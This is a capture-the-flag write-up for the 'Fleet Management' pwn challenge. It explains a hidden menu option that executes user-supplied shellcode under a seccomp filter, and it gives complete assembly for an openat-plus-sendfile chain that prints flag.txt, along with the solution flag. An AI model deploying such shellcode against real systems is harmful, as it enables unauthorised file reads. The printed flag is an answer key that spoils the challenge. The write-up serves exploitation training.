---
title: "Fleet Management"
ctf: "HTB Business CTF"
date: 2026-06-13
category: pwn
difficulty: easy
flag_format: "HTB{...}"
---

# Fleet Management

## Summary

A fleet management binary with a hidden `beta_feature` option (menu item 9) that allocates an RWX page, reads 60 bytes of shellcode, loads seccomp restricting syscalls to only `openat`, `sendfile`, `exit`, `exit_group`, and `rt_sigreturn`, then executes the shellcode. The allowed syscalls form a classic ORW chain using `openat` + `sendfile`.

## Solution

### Key Observations

- **beta_feature** (0x13e3): `malloc(60)` → `mprotect(RWX)` → `read(0, buf, 60)` → `skid_check()` (load seccomp) → `call buf`
- **Seccomp whitelist**: `openat(257)`, `sendfile(40)`, `exit(60)`, `exit_group(231)`, `sigreturn(15)` — classic open+sendfile ORW
- **No stack canary**, Full RELRO, PIE, NX

### Exploit Shellcode (52 bytes)

```asm
xor eax, eax
push rax                         ; null terminator
movabs rax, 0x7478742e67616c66   ; "flag.txt"
push rax                         ; "flag.txt\0..."
push rsp
pop rsi                          ; pathname
xor edx, edx                     ; O_RDONLY = 0
push -100
pop rdi                          ; AT_FDCWD
push 257
pop rax
syscall                          ; openat(AT_FDCWD, "flag.txt", 0)
mov esi, eax                     ; in_fd = returned fd
push 1
pop rdi                          ; out_fd = stdout
xor edx, edx                     ; offset = NULL
push 0x40
pop r10                          ; count = 64
push 40
pop rax
syscall                          ; sendfile(1, fd, NULL, 64)
xor edi, edi
push 60
pop rax
syscall                          ; exit(0)
```

## Flag

```
HTB{sh3llc0d3_45_4_b4ckd00r}
```
